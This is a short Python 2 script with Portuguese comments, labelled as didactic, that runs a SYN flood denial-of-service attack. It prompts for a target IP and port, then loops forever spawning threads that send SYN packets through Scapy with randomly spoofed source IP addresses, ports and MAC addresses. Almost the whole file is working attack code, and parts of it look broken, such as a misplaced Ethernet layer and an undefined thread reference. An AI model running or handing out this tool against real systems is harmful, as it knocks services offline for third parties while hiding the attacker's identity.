#!/usr/bin/python
#coding=utf-8
#coded by:S0ph0s
# Programa para fins didáticos a qual demonstra o ataque de SYN FLOOD.

from os import system
from random import randint	
import socket
from time import sleep
from thread import start_new_thread
from sys import exit
from scapy.all import *
from scapy.error import Scapy_Exception
number = 0

def synTCP(ip_alvo,porta_alvo):
	ip = IP()
	tcp = TCP()
	# recebendo IP do alvo
	ip.dst = ip_alvo 
	# criando spoofing do IP de modo aleatório 
	ip.src = "%i.%i.%i.%i" % (randint(1,254),randint(1,254),randint(1,254),randint(1,254))
	# porta de origem para fazer spoofing, valor da porta variando entre 1 a 65535
	tcp.sport = randint(1,65535) 
	# recebendo o valor da porta do alvo para "empacotamento"
	tcp.dport = porta_alvo 
	# definindo a flag para ataque, S = SYN
	tcp.flags = "S" 
	# empacotando e endereçando + MAC Spoofing
	send(ip/tcp/Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff"), loop= 1, verbose=1) 
	sleep(5) 
    	thread.exit() 

ip_alvo = raw_input ("Digite o IP: ")
porta_alvo = input ("Digite a porta :")

while(1):
	try:
		number = number + 1
		# criando a thread para otimizar o processo de ataque
		start_new_thread(synTCP,(ip_alvo,porta_alvo )) 
	 	print "Número de requisições ---> %s" %str(number)
	except socket.error:
		print ("Ataque encerrou!!!")
		exit(1)


